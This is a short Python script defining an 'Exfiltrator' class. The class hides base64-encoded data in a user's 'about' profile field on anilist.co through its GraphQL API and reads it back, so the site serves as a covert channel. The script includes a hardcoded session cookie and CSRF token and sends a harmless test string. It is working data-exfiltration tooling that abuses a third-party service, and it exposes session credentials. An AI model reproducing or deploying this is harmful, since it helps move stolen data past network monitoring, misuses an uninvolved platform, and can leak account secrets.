import requests
import base64

class Exfiltrator:
    def __init__(self, data_dict):
        self.data_dict = data_dict

    def send(self, bytes):
        cookies = {"laravel_session": self.data_dict["laravel_session"]}
        headers = {"X-Csrf-Token": self.data_dict["csrf_token"], "Content-Type": "application/json"}
        json = {
            "query": "mutation($about:String,$titleLanguage:UserTitleLanguage,$staffNameLanguage:UserStaffNameLanguage,$airingNotifications:Boolean,$displayAdultContent:Boolean,$scoreFormat:ScoreFormat,$rowOrder:String,$profileColor:String,$donatorBadge:String,$notificationOptions:[NotificationOptionInput],$animeListOptions:MediaListOptionsInput,$mangaListOptions:MediaListOptionsInput,$timezone:String,$activityMergeTime:Int $restrictMessagesToFollowing:Boolean,$disabledListActivity:[ListActivityOptionInput],){UpdateUser(about:$about,titleLanguage:$titleLanguage,staffNameLanguage:$staffNameLanguage,airingNotifications:$airingNotifications,displayAdultContent:$displayAdultContent,scoreFormat:$scoreFormat,rowOrder:$rowOrder,profileColor:$profileColor,donatorBadge:$donatorBadge,notificationOptions:$notificationOptions,animeListOptions:$animeListOptions,mangaListOptions:$mangaListOptions timezone:$timezone activityMergeTime:$activityMergeTime restrictMessagesToFollowing:$restrictMessagesToFollowing disabledListActivity:$disabledListActivity){id name about avatar{large}bannerImage unreadNotificationCount donatorTier donatorBadge moderatorRoles options{titleLanguage staffNameLanguage restrictMessagesToFollowing airingNotifications displayAdultContent profileColor timezone activityMergeTime notificationOptions{type enabled}disabledListActivity{type disabled}}mediaListOptions{scoreFormat rowOrder animeList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}mangaList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}}}}",
            "variables": {"about": base64.b64encode(bytes).decode()}}
        response = requests.post("https://anilist.co:443/graphql", headers=headers, cookies=cookies, json=json)

    def recv(self):
        cookies = {"laravel_session": self.data_dict["laravel_session"]}
        headers = {"X-Csrf-Token": self.data_dict["csrf_token"], "Content-Type": "application/json"}
        json = {
            "query": "query{Viewer{id name about avatar{large}bannerImage unreadNotificationCount donatorTier donatorBadge moderatorRoles options{titleLanguage staffNameLanguage restrictMessagesToFollowing airingNotifications displayAdultContent profileColor notificationOptions{type enabled}disabledListActivity{type disabled}}mediaListOptions{scoreFormat rowOrder animeList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}mangaList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}}}}",
            "variables": {}
        }
        response = requests.post("https://anilist.co:443/graphql", headers=headers, cookies=cookies, json=json)
        return base64.b64decode(response.json()["data"]["Viewer"]["about"]).decode()

x = Exfiltrator({"laravel_session":"j5tEPVsCFCq0PXzS6dkAh2ov6t8wqQkwXtC6jyOh", "csrf_token":"ZnQv2MFCTuGjQ0ntuIsmAsgOZpgMf7OqRgsAXxIR"})
x.send(b"snibbles")
print(x.recv())


